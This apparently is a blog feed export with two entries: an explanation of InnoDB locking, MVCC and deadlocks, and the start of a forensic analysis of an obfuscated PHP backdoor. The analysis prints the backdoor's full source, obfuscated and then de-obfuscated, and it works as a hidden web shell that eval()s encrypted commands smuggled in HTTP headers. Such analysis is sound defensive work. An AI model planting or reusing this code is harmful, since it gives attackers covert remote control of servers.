<h2 id="写锁-recordLock-gapLock-next-key-lock"><a href="#写锁-recordLock-gapLock-next-key-lock" class="headerlink" title="写锁-recordLock,gapLock,next key lock"></a>写锁-recordLock,gapLock,next key lock</h2><p><strong>对于使用到唯一索引 等值查询：比如，where columnA&#x3D;”…” ，如果columnA上的索引被使用到，</strong> <br><strong>那么会在满足where的记录上加行锁(for update是排他锁,lock in shared 是共享锁，其他写操作加排他锁)。这里是行级锁，record lock。</strong></p>
<p><strong>对于范围查询（使用非唯一的索引）：</strong> <br><strong>比如(做范围查询)：where columnA between 10 and 30 ,会导致其他会话中10以后的数据都无法插入(next key lock),从而解决了幻读问题。</strong></p>
<p><strong>这里是next key lock 会包括涉及到的所有行。</strong> <br><strong>next key lock&#x3D;recordLock+gapLock，不仅锁住相关数据，而且锁住边界，从而彻底避免幻读</strong>。<span class="exturl" data-url="aHR0cDovL2hlZGVuZ2NoZW5nLmNvbS8/cD03NzEjX1RvYzM3NDY5ODMyMg==">可点击查看这篇推荐文章<i class="fa fa-external-link-alt"></i></span></p>
<p><strong>对于没有索引</strong> <br><strong>锁表</strong> <br>通常发生在DDL语句\DML不走索引的语句中，比如这个DML update table set columnA&#x3D;”A” where columnB&#x3D;“B”. <br>如果columnB字段不存在索引（或者不是组合索引前缀），会锁住所有记录也就是锁表。如果语句的执行能够执行一个columnB字段的索引，那么会锁住满足where的行(行锁)。</p>
<p><strong>INNODB的MVCC通常是通过在每行数据后边保存两个隐藏的列来实现(其实是三列，第三列是用于事务回滚，此处略去)，</strong> <br><strong>一个保存了行的创建版本号，另一个保存了行的更新版本号（上一次被更新数据的版本号）</strong> <br>这个版本号是每个事务的版本号，递增的。</p>
<p>这样保证了innodb对读操作不需要加锁也能保证正确读取数据。</p>
<h2 id="MVCC-select无锁操作-与-维护版本号"><a href="#MVCC-select无锁操作-与-维护版本号" class="headerlink" title="MVCC select无锁操作 与 维护版本号"></a>MVCC select无锁操作 与 维护版本号</h2><p>下边在mysql默认的Repeatable Read隔离级别下，具体看看MVCC操作：</p>
<ul>
<li><p><strong>Select（快照读，所谓读快照就是读取当前事务之前的数据。）：</strong> <br>a.<strong>InnoDB只select查找版本号早于当前版本号的数据行</strong>，这样保证了读取的数据要么是在这个事务开始之前就已经commit了的（早于当前版本号），要么是在这个事务自身中执行创建操作的数据（等于当前版本号）。</p>
<p>b.查找行的更新版本号要么未定义，要么大于当前的版本号(为了保证事务可以读到老数据)，这样保证了事务读取到在当前事务开始之后未被更新的数据。 <br>注意： 这里的select不能有for update、lock in share 语句。 <br>总之要只返回满足以下条件的行数据，达到了快照读的效果：</p>
</li>
</ul>
<figure class="highlight lisp"><table><tr><td class="code"><pre><span class="line">(行创建版本号&lt; =当前版本号 <span class="symbol">&amp;&amp;</span> (行更新版本号==null or 行更新版本号&gt;当前版本号 ) )</span><br></pre></td></tr></table></figure>

<ul>
<li><p><strong>Insert</strong></p>
<p>InnoDB为这个事务中新插入的行，保存当前事务版本号的行作为行的行创建版本号。</p>
</li>
<li><p><strong>Delete</strong> <br>InnoDB为每一个删除的行保存当前事务版本号，作为行的删除标记。</p>
</li>
<li><p><strong>Update</strong></p>
<p>将存在两条数据，保持当前版本号作为更新后的数据的新增版本号，同时保存当前版本号作为老数据行的更新版本号。</p>
</li>
</ul>
<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line">当前版本号—写—&gt;新数据行创建版本号 <span class="meta">&amp;&amp; 当前版本号—写—&gt;老数据更新版本号();</span></span><br></pre></td></tr></table></figure>

<h2 id="脏读-vs-幻读-vs-不可重复读"><a href="#脏读-vs-幻读-vs-不可重复读" class="headerlink" title="脏读 vs 幻读 vs 不可重复读"></a>脏读 vs 幻读 vs 不可重复读</h2><p><strong>脏读</strong>：<strong>一事务未提交的中间状态的更新数据 被其他会话读取到。</strong> 当一个事务正在访问数据，并且对数据进行了修改，而这种修改还没有 提交到数据库中(commit未执行)，这时，另外会话也访问这个数据，因为这个数据是还没有提交， 那么另外一个会话读到的这个数据是脏数据，依据脏数据所做的操作也可能是不正确的。</p>
<p><strong>不可重复读</strong>：<strong>简单来说就是在一个事务中读取的数据可能产生变化，ReadCommitted也称为不可重复读</strong>。</p>
<p>在同一事务中，多次读取同一数据返回的结果有所不同。换句话说就是，后续读取可以读到另一会话事务已提交的更新数据。 相反，“可重复读”在同一事务中多次读取数据时，能够保证所读数据一样，也就是，后续读取不能读到另一会话事务已提交的更新数据。</p>
<p><strong>幻读</strong>：会话T1事务中执行一次查询，然后会话T2新插入一行记录，<strong>这行记录恰好可以满足T1所使用的查询的条件</strong>。然后T1又使用相同 的查询再次对表进行检索，但是此时却看到了事务T2刚才插入的新行。这个新行就称为“幻像”，因为对T1来说这一行就像突然 出现的一样。 <br>innoDB的RR级别无法做到完全避免幻读，下文详细分析。</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="comment">----------------------------------前置准备----------------------------------------</span></span><br><span class="line">prerequisite：</span><br><span class="line"><span class="comment">-- 创建表</span></span><br><span class="line">mysql&gt;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> `t_bitfly` (</span><br><span class="line">   `id` <span class="type">bigint</span>(<span class="number">20</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">&#x27;0&#x27;</span>,</span><br><span class="line">   `<span class="keyword">value</span>` <span class="type">varchar</span>(<span class="number">32</span>) <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span>,</span><br><span class="line">   <span class="keyword">PRIMARY KEY</span> (`id`)</span><br><span class="line"> )</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 确保当前隔离级别为默认的RR级别</span></span><br><span class="line"></span><br><span class="line">mysql&gt; <span class="keyword">select</span> @@<span class="keyword">global</span>.tx_isolation, @@tx_isolation;</span><br><span class="line">+<span class="comment">-----------------------+-----------------+</span></span><br><span class="line">| @@<span class="keyword">global</span>.tx_isolation | @@tx_isolation  |</span><br><span class="line">+<span class="comment">-----------------------+-----------------+</span></span><br><span class="line">| <span class="keyword">REPEATABLE</span>-<span class="keyword">READ</span>       | <span class="keyword">REPEATABLE</span>-<span class="keyword">READ</span> |</span><br><span class="line">+<span class="comment">-----------------------+-----------------+</span></span><br><span class="line"><span class="number">1</span> <span class="keyword">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"><span class="comment">---------------------------------------开始--------------------------------------------- </span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">session</span> A                                           |   <span class="keyword">session</span> B</span><br><span class="line">                                                    |</span><br><span class="line">                                                    |</span><br><span class="line">mysql&gt; <span class="keyword">START</span> <span class="keyword">TRANSACTION</span>;                           |   mysql&gt; <span class="keyword">START</span> <span class="keyword">TRANSACTION</span>;</span><br><span class="line">Query OK, <span class="number">0</span> <span class="keyword">rows</span> affected (<span class="number">0.00</span> sec)                |   Query OK, <span class="number">0</span> <span class="keyword">rows</span> affected (<span class="number">0.00</span> sec)                                        </span><br><span class="line">                                                    |   </span><br><span class="line">                                                    |</span><br><span class="line">mysql&gt; <span class="keyword">SELECT</span> * <span class="keyword">FROM</span> test.t_bitfly;                 |   mysql&gt; <span class="keyword">SELECT</span> * <span class="keyword">FROM</span> test.t_bitfly; </span><br><span class="line">Empty <span class="keyword">set</span> (<span class="number">0.00</span> sec)                                |   Empty <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line">                                                    |</span><br><span class="line">                                                    |   mysql&gt; <span class="keyword">INSERT</span> <span class="keyword">INTO</span> t_bitfly <span class="keyword">VALUES</span> (<span class="number">1</span>, <span class="string">&#x27;test&#x27;</span>);</span><br><span class="line">                                                    |   Query OK, <span class="number">1</span> <span class="keyword">row</span> affected (<span class="number">0.00</span> sec)</span><br><span class="line">                                                    |</span><br><span class="line">                                                    |</span><br><span class="line">mysql&gt; <span class="keyword">SELECT</span> * <span class="keyword">FROM</span> test.t_bitfly;                 |</span><br><span class="line">Empty <span class="keyword">set</span> (<span class="number">0.00</span> sec)                                |</span><br><span class="line">                                                    |</span><br><span class="line">                                                    |   mysql&gt; <span class="keyword">commit</span>;</span><br><span class="line">                                                    |   Query OK, <span class="number">0</span> <span class="keyword">rows</span> affected (<span class="number">0.01</span> sec)                                                </span><br><span class="line">mysql&gt; <span class="keyword">SELECT</span> * <span class="keyword">FROM</span> test.t_bitfly;                 |</span><br><span class="line">Empty <span class="keyword">set</span> (<span class="number">0.00</span> sec)                                |</span><br><span class="line"><span class="comment">-- 可以看到虽然两次执行结果返回的数据一致，         |</span></span><br><span class="line"><span class="comment">-- 但是不能说明没有幻读。接着看：                   |</span></span><br><span class="line">                                                    |</span><br><span class="line">mysql&gt; <span class="keyword">INSERT</span> <span class="keyword">INTO</span> t_bitfly <span class="keyword">VALUES</span> (<span class="number">1</span>, <span class="string">&#x27;test&#x27;</span>);     |</span><br><span class="line">ERROR <span class="number">1062</span> (<span class="number">23000</span>):                                 |</span><br><span class="line">Duplicate entry <span class="string">&#x27;1&#x27;</span> <span class="keyword">for key</span> <span class="string">&#x27;PRIMARY&#x27;</span>               |</span><br><span class="line">                                                    |</span><br><span class="line"><span class="comment">-- 明明为空的表，为什么说主键重复？——幻读出现 ！！！       |</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="如何保证rr级别绝对不产生幻读？"><a href="#如何保证rr级别绝对不产生幻读？" class="headerlink" title="如何保证rr级别绝对不产生幻读？"></a>如何保证rr级别绝对不产生幻读？</h2><p>在使用的select …where语句中加入 for update(排他锁) 或者 lock in share mode(共享锁)语句来实现。<strong>其实就是锁住了可能造成幻读的数据，阻止数据的写入操作。</strong></p>
<p>其实是因为数据的写入操作(insert 、update)需要先获取写锁，由于可能产生幻读的部分，已经获取到了某种锁，所以要在另外一个会话中获取写锁的前提是当前会话中释放所有因加锁语句产生的锁。</p>
<h2 id="mysql死锁问题"><a href="#mysql死锁问题" class="headerlink" title="mysql死锁问题"></a>mysql死锁问题</h2><p>死锁，就是产生了循环等待链条，我等待你的资源，你却等待我的资源，我们都相互等待，谁也不释放自己占有的资源，导致无线等待下去。 <br>比如：</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">//<span class="keyword">Session</span> A</span><br><span class="line"><span class="keyword">START</span> <span class="keyword">TRANSACTION</span>;</span><br><span class="line"><span class="keyword">UPDATE</span> account <span class="keyword">SET</span> p_money=p_money<span class="number">-100</span> <span class="keyword">WHERE</span> p_name=&quot;tim&quot;;</span><br><span class="line"><span class="keyword">UPDATE</span> account <span class="keyword">SET</span> p_money=p_money+<span class="number">100</span> <span class="keyword">WHERE</span> p_name=&quot;bill&quot;;</span><br><span class="line"><span class="keyword">COMMIT</span>;</span><br><span class="line">//Thread B</span><br><span class="line"><span class="keyword">START</span> <span class="keyword">TRANSACTION</span>;</span><br><span class="line"><span class="keyword">UPDATE</span> account <span class="keyword">SET</span> p_money=p_money+<span class="number">100</span> <span class="keyword">WHERE</span> p_name=&quot;bill&quot;;</span><br><span class="line"><span class="keyword">UPDATE</span> account <span class="keyword">SET</span> p_money=p_money<span class="number">-100</span> <span class="keyword">WHERE</span> p_name=&quot;tim&quot;;</span><br><span class="line"><span class="keyword">COMMIT</span>;</span><br></pre></td></tr></table></figure>

<p>当线程A执行到第一条语句UPDATE account SET p_money&#x3D;p_money-100 WHERE p_name&#x3D;”tim”;锁定了p_name&#x3D;”tim”的行数据；并且试图获取p_name&#x3D;”bill”的数据；</p>
<p>，此时，恰好，线程B也执行到第一条语句：UPDATE account SET p_money&#x3D;p_money+100 WHERE p_name&#x3D;”bill”;</p>
<p>锁定了 p_name&#x3D;”bill”的数据，同时试图获取p_name&#x3D;”tim”的数据； <br>此时，两个线程就进入了死锁，谁也无法获取自己想要获取的资源，进入无线等待中，直到超时！</p>
<p><strong>innodb_lock_wait_timeout 等待锁超时回滚事务：</strong> <br>直观方法是在两个事务相互等待时，当一个等待时间超过设置的某一阀值时，对其中一个事务进行回滚，另一个事务就能继续执行。这种方法简单有效，在innodb中，参数innodb_lock_wait_timeout用来设置超时时间。</p>
<p><strong>wait-for graph算法来主动进行死锁检测：</strong> <br>innodb还提供了wait-for graph算法来主动进行死锁检测，每当加锁请求无法立即满足需要并进入等待时，wait-for graph算法都会被触发。</p>
<p><strong>如何尽可能避免死锁</strong></p>
<p>1）以固定的顺序访问表和行。比如两个更新数据的事务，事务A 更新数据的顺序 为1，2；事务B更新数据的顺序为2，1。这样更可能会造成死锁。</p>
<p>2）大事务拆小。大事务更倾向于死锁，如果业务允许，将大事务拆小。</p>
<p>3）在同一个事务中，尽可能做到一次锁定所需要的所有资源，减少死锁概率。</p>
<p>4）降低隔离级别。如果业务允许，将隔离级别调低也是较好的选择，比如将隔离级别从RR调整为RC，可以避免掉很多因为gap锁造成的死锁。</p>
<p>5）为表添加合理的索引。可以看到如果不走索引将会为表的每一行记录添加上锁，死锁的概率大大增大。</p>
<p><strong>显式锁 与 隐式锁</strong> <br><strong>隐式锁</strong>:我们上文说的锁都属于不需要额外语句加锁的隐式锁。 <br><strong>显示锁</strong>：</p>
<figure class="highlight gams"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">SELECT</span></span> ... LOCK IN SHARE MODE(加共享锁);</span><br><span class="line"><span class="function"><span class="title">SELECT</span></span> ... <span class="keyword">FOR</span> UPDATE(加排他锁);</span><br></pre></td></tr></table></figure>

<p>详情上文已经说过。</p>
<p>通过如下sql可以查看等待锁的情况</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> information_schema.innodb_trx <span class="keyword">where</span> trx_state<span class="operator">=</span>&quot;lock wait&quot;;</span><br><span class="line">或</span><br><span class="line"><span class="keyword">show</span> engine innodb status;</span><br></pre></td></tr></table></figure>

<h2 id="mysql中的事务"><a href="#mysql中的事务" class="headerlink" title="mysql中的事务"></a>mysql中的事务</h2><figure class="highlight gams"><table><tr><td class="code"><pre><span class="line">show <span class="keyword">variables</span> like <span class="comment">&quot;autocommit&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">set</span> autocommit=0; <span class="comment">//0表示AutoCommit关闭</span></span><br><span class="line"><span class="keyword">set</span> autocommit=1; <span class="comment">//1表示AutoCommit开启</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li><strong>自动提交（AutoCommit，mysql默认）</strong></li>
</ul>
<p>mysql默认采用AutoCommit模式，也就是每个sql都是一个事务，并不需要显示的执行事务。 <br>如果autoCommit关闭，那么每个sql都默认开启一个事务，只有显式的执行“commit”后这个事务才会被提交。</p>
]]></content>
      <categories>
        <category>MySQL</category>
      </categories>
  </entry>
  <entry>
    <title>一个 PHP 混淆后门的分析</title>
    <url>/2018/06/php-back-door/</url>
    <content><![CDATA[<h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>朋友公司的某个站发现最近被上传了一个后门程序。为了取证我们抓取了 HTTP 请求流量，看到了一堆莫名其妙看似经过混淆的请求，响应也是看似 base64 的乱码。</p>
<p>用了 2 个小时静态分析了一遍，并写了利用脚本。后门程序看似是乱码，实际上经过了混淆，通过 eval () 可以执行任意 PHP 命令。</p>
<span id="more"></span>

<h2 id="后门源代码"><a href="#后门源代码" class="headerlink" title="后门源代码"></a>后门源代码</h2><figure class="highlight nsis"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Signature For Report</span></span><br><span class="line"><span class="comment"> */</span><span class="variable">$h</span>=<span class="string">&#x27;_)m/&quot;,&quot;/-/)m&quot;),)marray()m&quot;/&quot;,&quot;+&quot;)m),$)mss(<span class="variable">$s</span>[<span class="variable">$i</span>)m],0,<span class="variable">$e</span>))))m)m,<span class="variable">$k</span>)));<span class="variable">$o</span>=ob)m_get_c)monte)m)mnts)m();ob_end_clean)&#x27;</span><span class="comment">;/*</span></span><br><span class="line"> */<span class="variable">$H</span>=<span class="string">&#x27;m();<span class="variable">$d</span>=ba)mse64)m_encode)m(x(gzc)mompres)ms(<span class="variable">$o</span>),)m$)mk));print(&quot;&lt;)m<span class="variable">$k</span>&gt;<span class="variable">$d</span>&lt;)m/)m<span class="variable">$k</span>&gt;)m&quot;);@sessio)mn_d)mestroy();&#125;&#125;&#125;&#125;&#x27;</span><span class="comment">;/*</span></span><br><span class="line"> */<span class="variable">$N</span>=<span class="string">&#x27;mR;<span class="variable">$rr</span>)m=@<span class="variable">$r</span>[)m&quot;HTT)mP_RE)mFERER&quot;];<span class="variable">$ra</span>)m=)m@<span class="variable">$r</span>[&quot;HTTP_AC)mC)mEPT_LANG)mUAGE)m&quot;)m];if(<span class="variable">$rr</span>)m&amp;&amp;<span class="variable">$ra</span>)&#123;)m<span class="variable">$u</span>=parse_u)mrl(<span class="variable">$rr</span>);p&#x27;</span><span class="comment">;/*</span></span><br><span class="line"> */<span class="variable">$u</span>=<span class="string">&#x27;<span class="variable">$e</span>)&#123;)m<span class="variable">$k</span>=$)mkh.<span class="variable">$kf</span>;ob)m_start();)m@eva)ml(@gzunco)mmpr)mess(@x(@)mbase6)m4_deco)mde(p)m)mreg_re)mplace(array(&quot;/&#x27;</span><span class="comment">;/*</span></span><br><span class="line"> */<span class="variable">$f</span>=<span class="string">&#x27;<span class="variable">$i</span>&lt;$)ml;)m)&#123;)mfo)mr(<span class="variable">$j</span>)m=0;(<span class="variable">$j</span>&lt;<span class="variable">$c</span>&amp;&amp;<span class="variable">$i</span>&lt;<span class="variable">$l</span>);<span class="variable">$j</span>)m++,<span class="variable">$i</span>+)m+)&#123;$)mo.=<span class="variable">$t</span>&#123;<span class="variable">$i</span>)m&#125;^$)mk&#123;<span class="variable">$j</span>&#125;;&#125;&#125;r)meturn )m<span class="variable">$o</span>;&#125;<span class="variable">$r</span>)m=<span class="variable">$_SERVE</span>)&#x27;</span><span class="comment">;/*</span></span><br><span class="line"> */<span class="variable">$O</span>=<span class="string">&#x27;[<span class="variable">$i</span>]=&quot;&quot;;<span class="variable">$p</span>)m=$)m)mss(<span class="variable">$p</span>,3)m);&#125;if(ar)mray_)mkey_exists)m()m<span class="variable">$i</span>,<span class="variable">$s</span>))&#123;$)ms[<span class="variable">$i</span>].=<span class="variable">$p</span>)m;)m<span class="variable">$e</span>=s)mtrpos)m(<span class="variable">$s</span>[<span class="variable">$i</span>],<span class="variable">$f</span>);)mif(&#x27;</span><span class="comment">;/*</span></span><br><span class="line"> */<span class="variable">$w</span>=<span class="string">&#x27;)m));)m<span class="variable">$p</span>=&quot;&quot;;fo)mr(<span class="variable">$z</span>=1;)m<span class="variable">$z</span>&lt;c)mount()m<span class="variable">$m</span>[1]);$)mz++)m)m)<span class="variable">$p.</span>=<span class="variable">$q</span>[<span class="variable">$m</span>[)m)m2][<span class="variable">$z</span>]];if(str)mpo)ms(<span class="variable">$p</span>,<span class="variable">$h</span>))m===0)&#123;<span class="variable">$s</span>)m&#x27;</span><span class="comment">;/*</span></span><br><span class="line"> */<span class="variable">$P</span>=<span class="string">&#x27;trt)molower&quot;;$)mi=<span class="variable">$m</span>[1][0)m)m].<span class="variable">$m</span>[1][1])m;<span class="variable">$h</span>=<span class="variable">$sl</span>()m<span class="variable">$ss</span>(m)md5($)mi.<span class="variable">$kh</span>)m),0,)m3));<span class="variable">$f</span>=<span class="variable">$s</span>)ml(<span class="variable">$ss</span>()m)mmd5(<span class="variable">$i.</span><span class="variable">$kf</span>),0,3&#x27;</span><span class="comment">;/*</span></span><br><span class="line"> */<span class="variable">$i</span>=<span class="string">&#x27;)marse_)mstr)m(<span class="variable">$u</span>[&quot;q)muery&quot;],$)m)mq);<span class="variable">$q</span>=array)m_values()m<span class="variable">$q</span>);pre)mg_matc)mh_all()m&quot;/([\\w)m])m)[\\w-)m]+(?:;q=0.)&#x27;</span><span class="comment">;/*</span></span><br><span class="line"> */<span class="variable">$x</span>=<span class="string">&#x27;m([\\d)m]))?,?/&quot;,)m<span class="variable">$ra</span>,<span class="variable">$m</span>))m;if(<span class="variable">$q</span>)m&amp;&amp;$)mm))m)m&#123;@session_start();$)ms=&amp;<span class="variable">$_S</span>)mESSI)m)mON;$)mss=&quot;sub)mstr&quot;;<span class="variable">$sl</span>=&quot;s)m&#x27;</span><span class="comment">;/*</span></span><br><span class="line"> */<span class="variable">$y</span>=str_replace(<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;crbebbabte_funcbbtion&#x27;</span>)<span class="comment">;/*</span></span><br><span class="line"> */<span class="variable">$c</span>=<span class="string">&#x27;<span class="variable">$kh</span>=&quot;4f7)m)mf&quot;;<span class="variable">$kf</span>=&quot;2)m)m8d7&quot;;funct)mion x(<span class="variable">$t</span>)m,<span class="variable">$k</span>)&#123;$)m)mc=strlen(<span class="variable">$k</span>);<span class="variable">$l</span>=st)mrlen)m(<span class="variable">$t</span>);)m)m<span class="variable">$o</span>=&quot;&quot;;for()m<span class="variable">$i</span>=0;&#x27;</span><span class="comment">;/*</span></span><br><span class="line"> */<span class="variable">$L</span>=str_replace(<span class="string">&#x27;)m&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$c.</span><span class="variable">$f.</span><span class="variable">$N.</span><span class="variable">$i.</span><span class="variable">$x.</span><span class="variable">$P.</span><span class="variable">$w.</span><span class="variable">$O.</span><span class="variable">$u.</span><span class="variable">$h.</span><span class="variable">$H</span>)<span class="comment">;/*</span></span><br><span class="line"> */<span class="variable">$v</span>=<span class="variable">$y</span>(<span class="string">&#x27;&#x27;</span>,<span class="variable">$L</span>)<span class="comment">;$v();/*</span></span><br><span class="line"> */</span><br></pre></td></tr></table></figure>

<p>经过分析，最外层混淆进行的操作是：按顺序拼接字符串，删除其中的 ‘) m’，通过 create_function () 创建一个匿名函数 $v 并执行代码。</p>
<p>将代码导出并美化如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$kh</span>=<span class="string">&quot;4f7f&quot;</span>;</span><br><span class="line"><span class="variable">$kf</span>=<span class="string">&quot;28d7&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">x</span>(<span class="params"><span class="variable">$t</span>,<span class="variable">$k</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="title function_ invoke__">strlen</span>(<span class="variable">$k</span>);</span><br><span class="line">    <span class="variable">$l</span>=<span class="title function_ invoke__">strlen</span>(<span class="variable">$t</span>);</span><br><span class="line">    <span class="variable">$o</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="variable">$l</span>;)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span>=<span class="number">0</span>;(<span class="variable">$j</span>&lt;<span class="variable">$c</span>&amp;&amp;<span class="variable">$i</span>&lt;<span class="variable">$l</span>);<span class="variable">$j</span>++,<span class="variable">$i</span>++)&#123;</span><br><span class="line">            <span class="variable">$o</span>.=<span class="variable">$t</span>&#123;<span class="variable">$i</span>&#125;^<span class="variable">$k</span>&#123;<span class="variable">$j</span>&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$o</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$r</span>=<span class="variable">$_SERVER</span>;</span><br><span class="line"><span class="variable">$rr</span>=@<span class="variable">$r</span>[<span class="string">&quot;HTTP_REFERER&quot;</span>];</span><br><span class="line"><span class="variable">$ra</span>=@<span class="variable">$r</span>[<span class="string">&quot;HTTP_ACCEPT_LANGUAGE&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$rr</span>&amp;&amp;<span class="variable">$ra</span>)&#123;</span><br><span class="line">    <span class="variable">$u</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$rr</span>); </span><br><span class="line">    <span class="title function_ invoke__">parse_str</span>(<span class="variable">$u</span>[<span class="string">&quot;query&quot;</span>],<span class="variable">$q</span>); </span><br><span class="line">    <span class="variable">$q</span>=<span class="title function_ invoke__">array_values</span>(<span class="variable">$q</span>);        </span><br><span class="line">    </span><br><span class="line">    <span class="title function_ invoke__">preg_match_all</span>(<span class="string">&quot;/([\w])[\w-]+(?:;q=0.([\d]))?,?/&quot;</span>,<span class="variable">$ra</span>,<span class="variable">$m</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$q</span>&amp;&amp;<span class="variable">$m</span>)&#123;</span><br><span class="line">        @<span class="title function_ invoke__">session_start</span>();</span><br><span class="line">        <span class="variable">$s</span>=&amp;<span class="variable">$_SESSION</span>;</span><br><span class="line">        <span class="variable">$ss</span>=<span class="string">&quot;substr&quot;</span>;</span><br><span class="line">        <span class="variable">$sl</span>=<span class="string">&quot;strtolower&quot;</span>;</span><br><span class="line">        <span class="variable">$i</span>=<span class="variable">$m</span>[<span class="number">1</span>][<span class="number">0</span>].<span class="variable">$m</span>[<span class="number">1</span>][<span class="number">1</span>];  </span><br><span class="line">        <span class="variable">$h</span>=<span class="variable">$sl</span>(<span class="variable">$ss</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$i</span>.<span class="variable">$kh</span>),<span class="number">0</span>,<span class="number">3</span>)); </span><br><span class="line">        <span class="variable">$f</span>=<span class="variable">$sl</span>(<span class="variable">$ss</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$i</span>.<span class="variable">$kf</span>),<span class="number">0</span>,<span class="number">3</span>)); </span><br><span class="line">        <span class="variable">$p</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$z</span>=<span class="number">1</span>;<span class="variable">$z</span>&lt;<span class="title function_ invoke__">count</span>(<span class="variable">$m</span>[<span class="number">1</span>]);<span class="variable">$z</span>++)  </span><br><span class="line">            <span class="variable">$p</span>.=<span class="variable">$q</span>[<span class="variable">$m</span>[<span class="number">2</span>][<span class="variable">$z</span>]];         </span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$p</span>,<span class="variable">$h</span>)===<span class="number">0</span>)&#123;        </span><br><span class="line">            <span class="variable">$s</span>[<span class="variable">$i</span>]=<span class="string">&quot;&quot;</span>;        </span><br><span class="line">            <span class="variable">$p</span>=<span class="variable">$ss</span>(<span class="variable">$p</span>,<span class="number">3</span>);    </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">array_key_exists</span>(<span class="variable">$i</span>,<span class="variable">$s</span>))&#123;         </span><br><span class="line">            <span class="variable">$s</span>[<span class="variable">$i</span>].=<span class="variable">$p</span>;</span><br><span class="line">            <span class="variable">$e</span>=<span class="title function_ invoke__">strpos</span>(<span class="variable">$s</span>[<span class="variable">$i</span>],<span class="variable">$f</span>); </span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$e</span>)&#123;    </span><br><span class="line">                <span class="variable">$k</span>=<span class="variable">$kh</span>.<span class="variable">$kf</span>; </span><br><span class="line">                <span class="title function_ invoke__">ob_start</span>();</span><br><span class="line">                @<span class="keyword">eval</span>(@<span class="title function_ invoke__">gzuncompress</span>(@<span class="title function_ invoke__">x</span>(@<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">preg_replace</span>(<span class="keyword">array</span>(<span class="string">&quot;/_/&quot;</span>,<span class="string">&quot;/-/&quot;</span>),<span class="keyword">array</span>(<span class="string">&quot;/&quot;</span>,<span class="string">&quot;+&quot;</span>),<span class="variable">$ss</span>(<span class="variable">$s</span>[<span class="variable">$i</span>],<span class="number">0</span>,<span class="variable">$e</span>))),<span class="variable">$k</span>)));</span><br><span class="line">                <span class="variable">$o</span>=<span class="title function_ invoke__">ob_get_contents</span>();</span><br><span class="line">                <span class="title function_ invoke__">ob_end_clean</span>();</span><br><span class="line">                <span class="variable">$d</span>=<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">x</span>(<span class="title function_ invoke__">gzcompress</span>(<span class="variable">$o</span>),<span class="variable">$k</span>));</span><br><span class="line">                <span class="keyword">print</span>(<span class="string">&quot;&lt;<span class="subst">$k</span>&gt;<span class="subst">$d</span>&lt;/<span class="subst">$k</span>&gt;&quot;</span>);</span><br><span class="line">                @<span class="title function_ invoke__">session_destroy</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>好吧，还有第二层混淆。大概看了一下，x ($t,$k) 函数是个循环异或函数，结合 base64 函数、 gzcompress () 等函数看可能有 HTTP 请求和响应过程中的编码和加密。Payload 是从仅有的输入 $_SERVER [“HTTP_ACCEPT_LANGUAGE”] 和 $_SERVER [“HTTP_REFERER”] 中来。</p>
<p>分析了一番，稍加修改，得到：</p>
